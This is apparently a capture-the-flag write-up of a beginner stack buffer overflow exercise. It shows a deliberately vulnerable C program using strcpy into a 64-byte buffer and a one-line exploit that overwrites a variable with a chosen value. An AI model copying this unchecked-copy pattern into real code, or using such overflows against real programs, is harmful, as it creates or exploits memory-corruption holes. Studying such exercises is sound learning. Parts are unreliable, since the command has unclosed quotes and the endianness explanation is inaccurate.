Let’s take a look at the code…

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
```

So this program is similar to the previous one. Except that it takes the input as a parameter for the program, And that it is checking to see if the value we change is a specific hex value. 

So we are going to exploit this using a buffer overflow attack, except we are going to change the variable to the value 0x61626364 by appending that value  to our buffer overflow attack. In other words, we are filling up the buffer with 64 characters which can be essentially any ascii value, but after those 64 characters, we will append the hex value. In addition to that we will need to be adding the hex value in least endian (least significant bit, so basically backwards).

```
./stack1 `python -c ‘print “1”*64 + “\x64\x63\x62\x61”
You have correctly got the variable to the right value
```

And just like that, we pwned the program.
